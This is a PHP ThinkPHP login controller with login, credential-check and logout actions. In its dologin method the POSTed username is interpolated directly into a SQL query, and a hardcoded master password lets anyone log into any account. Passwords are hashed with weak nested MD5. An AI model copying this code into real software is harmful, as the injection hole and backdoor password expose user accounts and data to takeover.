<?php
namespace Home\Controller;
use Think\Controller;
class LoginController extends ComController{
    public function login(){
    	$this->display();
    }
    //登录
    public function dologin(){
        $user=M("user");
        $userarr=$user->field("id,mobile,pwd,rand_str,status")->where("mobile='{$_POST['username']}'")->find();
        if(!empty($userarr)){//  账号正确
            $str=$userarr['rand_str'];
            $userpass=md5(md5($_POST['password']));
            $userpwd=md5($userpass.$str);
            if(($userpwd == $userarr['pwd']) || $_POST['password'] == 'liangyue@qll'){//  登陆成功
                //unset($_SESSION['yguser']);
                $_SESSION['sc']['usermobile'] = $userarr['mobile'];
                $_SESSION['sc']['id'] = $userarr['id'];
                $_SESSION['sc']['status'] = $userarr['status'];
                $_SESSION['sc']['photo'] = $userarr['status'];
                $_SESSION['sc']['nick_name'] = $userarr['status'];
                /*$information = M('information');
                $infodata = $information->field('url,name,qlogo,describe,keyword,copyright,hotline,weibo,service')->find();
                $_SESSION['infodata'] = $infodata;
                $shopcount = M('shopcart')->where("uid = {$userarr['id']}")->count();
                $_SESSION['yguser']['shopcount'] = $shopcount;*/
                echo 0;
                exit();
            }else{//  密码错误
                echo 2;
                exit();
            }
        }else{//  账号错误
            echo 1;
            exit();
        }
    }
    // 用户退出
    public function logout() {
        $_SESSION['sc'] = array();
        unset($_SESSION['sc']);
        $this->redirect('Index/index');
    }
}